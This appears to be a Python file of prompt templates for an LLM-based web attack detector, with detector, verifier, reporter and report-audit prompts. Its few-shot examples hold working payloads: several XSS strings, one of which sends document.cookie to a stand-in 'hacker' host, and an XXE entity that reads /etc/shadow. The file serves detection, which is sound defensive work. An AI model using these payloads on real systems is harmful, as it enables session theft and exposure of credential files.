analysis: the result of url decoding is <script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?' + document.cookie</script>, The payload contains a XSS attack that uses the document.location and document.cookie properties to steal cookies. This can be used to test for XSS vulnerabilities and potentially execute malicious scripts in the user's browser. So, Result: XSS Attack, Cause: The payload is a XSS attack that uses the document.location and document.cookie properties to steal cookies, indicating a potential vulnerability.;

Example 4:
payload: %2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29
analisys: the result of url decoding is %22background:url(javascript:alert('Paros')), The payload contains a XSS attack that uses the background property to execute a JavaScript alert. This can be used to test for XSS vulnerabilities and potentially execute malicious scripts in the user's browser. So, Result: XSS Attack, Cause: The payload is a XSS attack that uses the background property to execute a JavaScript alert, indicating a potential vulnerability.;

here are some optional attack type: `SQL Injection Attack`, `XSS Attack`, `XXE Attack`, and `SSI Attack`, `Other Attack`
Now, please analyze the following payload:
payload: {payload}
analysis:
"""

detector_xxe_payload_cot_prompt = """
You are a powerful XXE attack expert. Your task is to check whether a given statement has an attack. 
Here are some examples of how to analyze the attack:

Example 1:
payload: <!--?xml version=\"1.0\" ?--><!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/shadow\"> ]><userInfo> <firstName>John</firstName> <lastName>&ent;</lastName></userInfo>
analysis: The payload contains a XXE attack that uses external entity definitions and references to allow reading of local sensitive files on the server, which is a typical XXE attack method. So, Result: XXE Attack, Cause: The payload is a XXE attack that uses the external entity definitions and references,  allowing reading of local sensitive files on the server.;

here are some optional attack type: `SQL Injection Attack`, `XSS Attack`, `XXE Attack`, and `SSI Attack`, `Other Attack`
Now, please analyze the following payload:
payload: {payload}
analysis:
"""

detector_xss_payload_cot_prompt_v1 = """
You are a powerful XSS attack expert. Your task is to check whether a given statement has an attack. 
Here are some examples of how to analyze the attack:

Example 1:
payload: bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org
analysis: the result of url decoding is bob<SCript>alert(Paros)</scrIPT>.parosproxy.org, The payload contains a XSS attack that uses the alert function to display a message. This can be used to test for XSS vulnerabilities and potentially execute malicious scripts in the user's browser. So, Result: XSS Attack, Cause: The payload is a XSS attack that uses the alert function to display a message, indicating a potential vulnerability.;

Example 2:
payload: registro%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E
analysis: the result of url decoding is registro<SCRIPT>alert("Paros");</SCRIPT>, The payload contains a XSS attack that uses the alert function to display a message. This can be used to test for XSS vulnerabilities and potentially execute malicious scripts in the user's browser. So, Result: XSS Attack, Cause: The payload is a XSS attack that uses the alert function to display a message, indicating a potential vulnerability.;

Example 3:
payload: %3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E
analysis: the result of url decoding is <script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?' + document.cookie</script>, The payload contains a XSS attack that uses the document.location and document.cookie properties to steal cookies. This can be used to test for XSS vulnerabilities and potentially execute malicious scripts in the user's browser. So, Result: XSS Attack, Cause: The payload is a XSS attack that uses the document.location and document.cookie properties to steal cookies, indicating a potential vulnerability.;

Example 4:
payload: %2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29
analisys: the result of url decoding is %22background:url(javascript:alert('Paros')), The payload contains a XSS attack that uses the background property to execute a JavaScript alert. This can be used to test for XSS vulnerabilities and potentially execute malicious scripts in the user's browser. So, Result: XSS Attack, Cause: The payload is a XSS attack that uses the background property to execute a JavaScript alert, indicating a potential vulnerability.;

Now, please analyze the following payload:
payload: {payload}
analysis:
"""

detector_xss_payload_cot_advice_prompt = """
In the last round, you and your colleague detector_summary made inconsistent judgments. Here are some optimization tips for you:
{detector_content_advice}
Here are some examples of how to analyze the attack:

Example 1:
payload: bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org
analysis: the result of url decoding is bob<SCript>alert(Paros)</scrIPT>.parosproxy.org, The payload contains a XSS attack that uses the alert function to display a message. This can be used to test for XSS vulnerabilities and potentially execute malicious scripts in the user's browser. So, Result: XSS Attack, Cause: The payload is a XSS attack that uses the alert function to display a message, indicating a potential vulnerability.;

Example 2:
payload: registro%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E
analysis: the result of url decoding is registro<SCRIPT>alert("Paros");</SCRIPT>, The payload contains a XSS attack that uses the alert function to display a message. This can be used to test for XSS vulnerabilities and potentially execute malicious scripts in the user's browser. So, Result: XSS Attack, Cause: The payload is a XSS attack that uses the alert function to display a message, indicating a potential vulnerability.;

Example 3:
payload: %3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E
analysis: the result of url decoding is <script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?' + document.cookie</script>, The payload contains a XSS attack that uses the document.location and document.cookie properties to steal cookies. This can be used to test for XSS vulnerabilities and potentially execute malicious scripts in the user's browser. So, Result: XSS Attack, Cause: The payload is a XSS attack that uses the document.location and document.cookie properties to steal cookies, indicating a potential vulnerability.;

Example 4:
payload: %2522background%3Aurl%28javascript%3Aalert%28%27Paros
analisys: the result of url decoding is %22background:url(javascript:alert('Paros')), The payload contains a XSS attack that uses the background property to execute a JavaScript alert. This can be used to test for XSS vulnerabilities and potentially execute malicious scripts in the user's browser. So, Result: XSS Attack, Cause: The payload is a XSS attack that uses the background property to execute a JavaScript alert, indicating a potential vulnerability.;

here are some optional attack type: `SQL Injection Attack`, `XSS Attack`, `XXE Attack`, and `SSI Attack`, `Other Attack`
Now, please combine the suggestions and give your new judgment:
payload: {payload}
analysis:
"""

detector_xxe_payload_cot_advice_prompt = """
In the last round, you and your colleague detector_summary made inconsistent judgments. Here are some optimization tips for you:
{detector_content_advice}
Here are some examples of how to analyze the attack:

Example 1:
payload: <!--?xml version=\"1.0\" ?--><!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/shadow\"> ]><userInfo> <firstName>John</firstName> <lastName>&ent;</lastName></userInfo>
analysis: The payload contains a XXE attack that uses external entity definitions and references to allow reading of local sensitive files on the server, which is a typical XXE attack method. So, Result: XXE Attack, Cause: The payload is a XXE attack that uses the external entity definitions and references,  allowing reading of local sensitive files on the server.;

here are some optional attack type: `SQL Injection Attack`, `XSS Attack`, `XXE Attack`, and `SSI Attack`, `Other Attack`
Now, please combine the suggestions and give your new judgment:
payload: {payload}
analysis:
"""

verifier_prompt = """
You are a smart {category} injection attack verifier.
Your colleagues detector_content and detector_summary have performed {category} injection attack detection on the original statement and the content after the statement semantics are extracted. 
Now your task is to combine the original statement, the results of detector_content, and the results of detector_summary to verify whether the results of the two are correct.

## **Instructions**
- Make full use of the information given to conduct effective and accurate verification
- The output structure consists of two parts, the result and the cause, starting with Result: and Cause: respectively.

## **References**
- original statement: {statement}
- the result of detector_content: {contentResult}
- the result of detector_summary: {summaryResult}
"""

verifier_consistency_prompt = """
You are a smart {category} injection attack verifier.
Your colleagues detector_content and detector_summary have performed {category} injection attack detection on the original statement and the content after the statement semantics are extracted. 
Now your task is to combine the results of detector_content, and the results of detector_summary to verify whether the results of the two are consistency.

## **Instructions**
- Make full use of the information given to conduct effective and accurate judement.
- If the two are inconsistent, provide brief but precise suggestions to detector_content and detector_summary for better detection.
- If the two are consistent, the result is true
- If the result is false, the output structure consists of two parts, the detector_content_advice and detector_summary_advice, starting with detector_content_advice: and detector_summary_advice: respectively.
- If result is true, just output result: true, nothing else

## **Output**
result: ...
detector_content_advice: ...
detector_summary_advice: ...

## **References**
- the result of detector_content: {contentResult}
- the result of detector_summary: {summaryResult}
"""

verifier_and_consistency_prompt = """
You are a smart {category} injection attack verifier.
Your colleagues detector_content and detector_summary have performed {category} injection attack detection on the original statement and the content after the statement semantics are extracted. 
your task is to combine the results of detector_content, and the results of detector_summary to verify whether the results of the two are consistency. if it is consistent, please summary the results.

## **Instructions**
- Make full use of the information given to conduct effective and accurate verification
- First, perform a consistency check. After the check passes, summarize the test results and determine the cause based on the reference content.
- If the results of detector_content and detector_summary are inconsistent, provide brief but precise suggestions (Including another colleague's judgment) to detector_content and detector_summary for better detection, starting with detector_content_advice: and detector_summary_advice: respectively.
- If the two results are consistent, summarize the test results and determine the cause based on the reference content, starting with Result: and Cause: respectively.
- The two types of output modes are mutually exclusive, and only one required output mode is retained
- Use the flag keyword to determine whether they are consistent. flag=0 indicates inconsistency, and flag=1 indicates consistency.
- The core of consistency judgment is to determine whether there is a vulnerability, `Potential SQL Injection Attack` and `Attack detected` are consistent.

## **Output**
flag=.
Result: ...
Cause: ...
detector_content_advice: ...
detector_summary_advice: ...

## **References**
- original statement: {statement}
- the result of detector_content: {contentResult}
- the result of detector_summary: {summaryResult}
"""

verifier_and_consistency_prompt_without_structure_output = """
You are a smart {category} injection attack verifier.
Your colleagues detector_content and detector_summary have performed {category} injection attack detection on the original statement and the content after the statement semantics are extracted. 
your task is to combine the results of detector_content, and the results of detector_summary to verify whether the results of the two are consistency. if it is consistent, please summary the results.

## **Instructions**
- Make full use of the information given to conduct effective and accurate verification
- First, perform a consistency check. After the check passes, summarize the test results and determine the cause based on the reference content.
- If the results of detector_content and detector_summary are inconsistent, provide brief but precise suggestions (Including another colleague's judgment) to detector_content and detector_summary for better detection, starting with detector_content_advice: and detector_summary_advice: respectively.
- If the two results are consistent, summarize the detect results and determine the cause based on the reference content, starting with Result: and Cause: respectively.
- The two types of output modes are mutually exclusive, and only one required output mode is retained
- Use the flag keyword to determine whether they are consistent. flag=0 indicates inconsistency, and flag=1 indicates consistency.
- The core of consistency judgment is to determine whether there is a vulnerability, `Potential SQL Injection Attack` and `Attack detected` are consistent.

## **Output**
flag=.
Result: ...
Cause: ...
detector_content_advice: ...
detector_summary_advice: ...

## **Example**
example one:
step1: judge the consistency, through the result of the detector_content and detector_summary, if it's consistent, set the `flag=1`, and continue to the step2
step2: if the flag=1, then through the References, summarize the detect results and the cause of the result, such as, `Result: SQL injection` and `Cause: ....`
As a result, the final output is as follows:
flag=1
Result: SQL injection
Cause: ...

example two:
step1: judge the consistency, if it's inconsistent, set the `flag=0`, and continue to the step2
step2: if the flag=0, then provide some hints for detect_content and detect_summary, such as, `detector_content_advice: ...` and `detector_summary_advice: ...`
As as result, the final output is as follows:
flag=0
detector_content_advice: ...
detector_summary_advice: ...

## **References**
- original statement: {statement}
- the result of detector_content: {contentResult}
- the result of detector_summary: {summaryResult}
"""

verifier_and_consistency_prompt_without_structure_output1 = """
You are a smart {category} injection attack verifier.
Your colleagues detector_content and detector_summary have performed {category} injection attack detection on the original statement and the content after the statement semantics are extracted. 
your task is to combine the results of detector_content, and the results of detector_summary to verify whether the results of the two are consistency. if it is consistent, please summary the results.

## **Instructions**
- Make full use of the information given to conduct effective and accurate verification
- If the results of detector_content and detector_summary are inconsistent, provide brief but precise suggestions (Including another colleague's judgment) to detector_content and detector_summary for better detection, starting with detector_content_advice: and detector_summary_advice: respectively.
- If the two results are consistent, summarize the detect results and determine the cause based on the reference content, starting with Result: and Cause: respectively.
- Use the flag keyword to determine whether they are consistent. flag=0 indicates inconsistency, and flag=1 indicates consistency.
- The core of consistency judgment is to determine whether there is a vulnerability, `Potential SQL Injection Attack` and `Attack detected` are consistent.
- Use the `attack` field to determine if attack behavior exists; set it to false if no attack behavior exists
- If `Result` field are SQL inject, XSS or SSI attack, they belong to attack behavior, set `attack` to true

## **Output Format**
flag=.
Result: ...
Cause: ...
detector_content_advice: ...
detector_summary_advice: ...
attack: ...

## **Example**
example one:
For given reference, such as original statement, the result of detector_content and detector_summary
step1: judge the consistency, through the result of the detector_content and detector_summary, if it's consistent, set the `flag=1`, and continue to the step2
step2: if the flag=1, then through the References, summarize the detect results and the cause of the result, such as, `Result: SQL injection` and `Cause: ....`
As a result, the final output is as follows:
```text
flag=1
attack: true
Result: SQL injection
Cause: ...
```

example two:
step1: judge the consistency, if it's inconsistent, set the `flag=0`, and continue to the step2
step2: if the flag=0, then provide some hints for detect_content and detect_summary, such as, `detector_content_advice: ...` and `detector_summary_advice: ...`
As as result, the final output is as follows:
```text
flag=0
detector_content_advice: ...
detector_summary_advice: ...
```text

## **References**
- original statement: {statement}
- the result of detector_content: {contentResult}
- the result of detector_summary: {summaryResult}
"""

verifier_anomalous_and_consistency_prompt_without_structure_output1 = """
You are a smart http request anomalous behavior verifier.
Your colleagues detector_anomalous and detector_anomalous_native have performed anomalous behavior detection on the original statement and the content after the statement semantics are extracted. 
your task is to combine the results of detector_anomalous, and the results of detector_anomalous_native to verify whether the results of the two are consistency. if it is consistent, please summary the results.

## **Instructions**
- Make full use of the information given to conduct effective and accurate verification
- Please do not generate programming code
- If the two results are consistent, summarize the detect results and determine the cause based on the reference content, starting with Result: and Cause: respectively.
- Use the flag keyword to determine whether they are consistent. flag=0 indicates inconsistency, and flag=1 indicates consistency.

## **Output Format**
flag=.
Result: ...
Cause: ...

## **Example**
example one:
For given reference, such as original statement, the result of detector_anomalous and detector_anomalous_native
step1: judge the consistency, through the result of the detector_anomalous and detector_anomalous_native, if it's consistent, continue to the step2
step2: then through the References, summarize the detect results and the cause of the result, such as, `Result: Error Report behavior` and `Cause: ....`
As a result, the final output is as follows:
```text
flag=1
Result: Error Report behavior
Cause: ...
```

example two:
step1: judge the consistency, if it's inconsistent, and continue to the end
As a result, the final output is as follows:
```text
flag=0
```text

## **References**
- original statement: {statement}
- the result of detector_content: {contentResult}
- the result of detector_summary: {summaryResult}
"""

reporter_prompt = """
You are a intelligent report generator.
Your previous colleague Verifier has completed the vulnerability verification of the given statement. 
Your task is to summarize the vulnerability type, the location of the vulnerability statement in the http request package, the vulnerability statement, and the vulnerability cause based on the given verification results, the JSON data parsed from the original HTTP request, and the vulnerability statement.

## **References**
- verification result: {verifyResult}
- the JSON data parsed from the original HTTP request: {originalJson}
- vulnerability statement: {vulStatement}
"""

reporter_prompt1 = """
You are a intelligent report generator.
Your previous colleague Verifier has completed the vulnerability verification of the given statement. 
Your task is to summarize the vulnerability type, the location of the vulnerability statement in the http request package, the vulnerability statement, and the vulnerability cause based on the given verification results, the JSON data parsed from the original HTTP request, and the vulnerability statement.

## **Output**
"vuln": ...,
"position": ...,
"statement": ...,
"cause":...

## **Instruction**
- Organize the output and make full use of tools to make the output meet the expected output

## **References**
- verification result: {verifyResult}
- the JSON data parsed from the original HTTP request: {originalJson}
- vulnerability statement: {vulStatement}
"""

reporter_anomalous_prompt = """
You are a intelligent report generator.
Your previous colleague detector_anomalous has completed the anomalous judgment of the given statement. 
Your task is to summarize the anomalous result(anomalous or normal), the location of the anomalous statement in the http request package, the anomalous statement, and the anomalous cause based on the given judge results, the JSON data parsed from the original HTTP request.

## **Output**
"result": ...,
"position": ...,
"statement": ...,
"cause":...

## **Instruction**
- Organize the output and make full use of tools to make the output meet the expected output

## **References**
- verification result: {verifyResult}
- the JSON data parsed from the original HTTP request: {originalJson}
"""

reporter_anomalous_prompt1 = """
You are a intelligent report generator.
Your previous colleague detector_anomalous has completed the anomalous judgment of the given statement. 
Your task is to summarize the anomalous result(anomalous or normal), the location of the anomalous statement in the http request package, the anomalous statement, and the anomalous cause based on the given judge results, the JSON data parsed from the original HTTP request.

## **Output**
"result": ...,
"position": ...,
"statement": ...,
"cause":...

## **Instruction**
- Organize the output and make full use of tools to make the output meet the expected output
- If the identification is normal, the returned result is normal, the position and statement are none, and the cause is the normal reason.

## **Output Example**
example one:
if the result is normal, the output format as follows:
```json
{
    "result": "normal",
    "position": "none",
    "statement": "none",
    "cause": "the input is normal request"
}
```
example two:
if the result is anomalous, the output format as follows:
```json
{
    "result": "anomalous",
    "position": "query_params.id",
    "statement": "\\"2/\\"",
    "cause": "`Find injection location`, triggered by the trailing slash '/' in the id parameter"
}
```

## **References**
- anomalous result: {verifyResult}
- the JSON data parsed from the original HTTP request: {originalJson}
"""

reporter_anomalous_prompt2_bak = """
You are a intelligent report generator.
Your previous colleague detector_anomalous has completed the anomalous judgment of the given statement. 
Your task is to summarize the anomalous result(anomalous or normal), the location of the anomalous statement in the http request package, the anomalous statement, and the anomalous cause based on the given judge results, the JSON data parsed from the original HTTP request.

## **Instruction**
- Organize the output and make full use of tools to make the output meet the expected output
- If the identification is normal, the returned result is normal, the position and statement are none, and the cause is the normal reason.
- 'Output Example' provides output content formats for different results. Please follow the format, but do not copy the content directly. The specific content depends on the anomalous result.
- The judgment result of "anomalous result" is not changed, and its content is directly used as the cause field in the final result.

## **Output format**
"result": ...,
"position": ...,
"statement": ...,
"cause":...

## **Output Example (just for example)**
for normal example:
if the result is normal, the output format as follows:
```json
{
    "result": "normal",
    "position": "none",
    "statement": "none",
    "cause": "the input is normal request"
}
```
for anomalous example:
if the result is anomalous caused by the trailing slash '/' in the id parameter, the output format as follows:
```json
{
    "result": "anomalous",
    "position": "query_params.id",
    "statement": "\\"2/\\"",
    "cause": "`Find injection location`, triggered by the trailing slash '/' in the id parameter"
}
```

## **References**
- anomalous result: {verifyResult}
- the JSON data parsed from the original HTTP request: {originalJson}
"""

reporter_anomalous_prompt2 = """
You are a intelligent report generator.
Your previous colleague detector_anomalous has completed the anomalous judgment of the given statement. 
Your task is to summarize the verify result(anomalous or normal), the location of the anomalous statement in the http request package, the anomalous statement, and the anomalous cause based on the given judge results, the JSON data parsed from the original HTTP request.

## **Instruction**
- Organize the output and make full use of tools to make the output meet the expected output
- If the identification is normal, the returned result is normal, the position and statement are none, and the cause is the normal reason.
- 'Output Example' provides output content formats for different results. Please follow the format, but do not copy the content directly. The specific content depends on the anomalous result.
- The judgment result of "anomalous result" is not changed, and its content is directly used as the cause field in the final result.

## **Output format**
"result": ...,
"position": ...,
"statement": ...,
"cause":...

## **Output Example (just for example)**
for normal example:
if the result is normal, the output format as follows:
```json
{
    "result": "normal",
    "position": "none",
    "statement": "none",
    "cause": "the input is normal request"
}
```
for anomalous example:
if the result is anomalous caused by the trailing slash '/' in the id parameter, the output format as follows:
```json
{
    "result": "anomalous",
    "position": "query_params.id",
    "statement": "\\"2/\\"",
    "cause": "`Find injection location`, triggered by the trailing slash '/' in the id parameter"
}
```
for anomalous example:
if the result is anomalous caused by the special characters 'A' in the idA parameter, the output format as follows:
```json
{
    "result": "anomalous",
    "position": "query_params.idA[0]",
    "statement": "idA",
    "cause": "`Error Report behavior`, triggered by adding special characters like 'A' after normal parameters in the body parameter 'idA'"
}
```

## **References**
- verify result: {verifyResult}
- the JSON data parsed from the original HTTP request: {originalJson}
"""

report_audit_prompt = """
You are an excellent reviewer of risk inspection reports.
Your task is to review the risk inspection report generated by your colleague Reporter (given in **References** part), the JSON data parsed from the risk type, and the risk statement, and the reason for the risk.
Please check whether the report meets the following requirements:
1. Determine whether the content of the provided statement has the hazards described in cause
2. According to the report generated by the report, determine whether it is an abnormal behavior or vulnerability attack behavior with impact, 

## **Instructions**
- Use flag and confidence to give your judgment result. If the report is a correct anomaly report or vulnerability exploit report, the output is flag=1 and the corresponding confidence value. If it is an untrustworthy report, the input is flag=0 and the confidence value you gave for the judgment.
- My goal is to detect whether the statement in the report contains the risk described in the cause, because sometimes the report will be wrong, resulting in a wrong judgment even though the cause description seems correct.

## **Output Format**
flag=.
confidence=.

## **Example**
example one:
For given reference, such as risk inspection report, the JSON data parsed from the risk type, and the risk statement, and the reasons for this risk
step1: Determine whether the content in the statement contains the anomalous or malicious hazards mentioned in the cause, if it is, set the `flag=1`
step2: give the confidence value for your judgment, such as, `confidence=0.9`
As a result, the final output is as follows:
```text
flag=1
confidence=0.9
```

example two:
step1: judge whether the report is trustworthy, if it is untrustworthy, set the `flag=0`
step2: give the confidence value for your judgment, such as, `confidence=0.4`
As as result, the final output is as follows:
```placehodler
flag=0
confidence=0.4
```

## **References**
risk inspection report: {reportResult}
"""

report_audit_prompt_v1 = """
My goal is to detect whether the statement in the report contains the risk described in the cause, because sometimes the report will be wrong, resulting in a wrong judgment even though the cause description seems correct.
For given reference, such as risk inspection report, the JSON data parsed from the risk type, and the risk statement, and the reasons for this risk
All the statements and causes mentioned below are from the corresponding content in the provided References
so, please check whether the statement is anomalous or malicious, don't generate programming code.

## **Example**
example one:
step1: First, focus only on the content of the `statement` to determine whether the string contains malicious or anomalous behavior, if it is, continue to the step2, if it is not, set the `flag=0`, and go to the end
step2: Determine whether the anomalous or malicious result of the step1 is the same as the mentioned in the `cause`, if it is, set the `flag=1`, if it is not, set the `flag=0`, and provide the confidence value for your judgment, such as, `confidence=0.9`
As a result, the final output is as follows:
```text
flag=1
confidence=0.9
```

example two:
step1: First, focus only on the content of the `statement` to determine whether the string contains malicious or anomalous behavior. if it is not, set the `flag=0`, and provide the confidence value for your judgment, such as, `confidence=0.6`
As as result, the final output is as follows:
```placehodler
flag=0
confidence=0.6
```

## **References**
risk inspection report: {reportResult}
"""

xiaohong_for_single_detetor_prompt = """
You are a smart {category} injection attack verifier.
Your colleagues have performed {category} injection attack detection. 
your task is to Use the `attack` field to determine if malicious behavior exists; set it to false if no malicious behavior exists.

## **Instructions**
- Make full use of the information given to conduct effective and accurate verification
- Do not generate programming code

## **Output Format**
Result: ...
Cause: ...
attack: ...

## **Example**
example one:
For given reference, such as original statement, the result of detector
step1: summary the result of detector, and continue to the step2
step2: determine whether there is malicious behavior exists, if it is, set the `attack: true`, if not, set the `attack: false`, then through the References, summarize the detect results and the cause of the result, such as, `Result: SQL injection` and `Cause: ....`
As a result, the final output is as follows:
```text
attack: true
Result: SQL injection
Cause: ...
```

## **References**
- original statement: {statement}
- the result of detector: {Result}
"""